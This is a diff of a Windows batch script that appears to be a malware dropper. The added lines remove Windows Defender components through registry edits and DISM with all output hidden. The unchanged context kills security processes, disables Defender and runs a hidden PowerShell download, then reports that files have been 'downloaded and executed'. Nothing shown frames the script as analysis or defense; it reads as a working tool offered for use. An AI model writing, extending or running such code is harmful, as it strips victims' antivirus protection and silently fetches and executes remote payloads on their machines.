@@ -15,9 +15,16 @@ taskkill /f /im NisSrv.exe
 taskkill /f /im UserAccountControlSettings.exe
 taskkill /f /im taskkill.exe
 
-echo Processes have been killed.
 
-timeout /t 5 >nul
+set "defender_packages=Windows-Defender-Nis-Group-Package Windows-Defender-Management-Powershell-Group-Package Windows-Defender-Management-MDM-Group-Package Windows-Defender-Management-Group-Package Windows-Defender-Group-Policy-Package Windows-Defender-Core-Group-Package Windows-Defender-Client-Package Windows-Defender-ApplicationGuard-Inbox-WOW64-Package Windows-Defender-ApplicationGuard-Inbox-Package Windows-Defender-AppLayer-Group-Package Windows-Defender-AM-Default-Definitions-Package Windows-Defender-AM-Default-Definitions-OptionalWrapper-Package"
+
+for %%i in (%defender_packages%) do (
+    for /f "tokens=8 delims=\" %%j in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "%%i" ^| findstr "~~"') do (
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%%j" /v Visibility /t REG_DWORD /d 1 /f >nul 2>&1
+        reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%%j\Owners" /va /f >nul 2>&1
+        dism /online /Remove-Package /PackageName:%%j /NoRestart >nul 2>&1
+    )
+)
 
 :: Function to disable Windows Defender
 :disable_windows_defender
@@ -40,4 +47,4 @@ powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).Downl
 
 echo Files have been downloaded and executed.
 
-exit
+
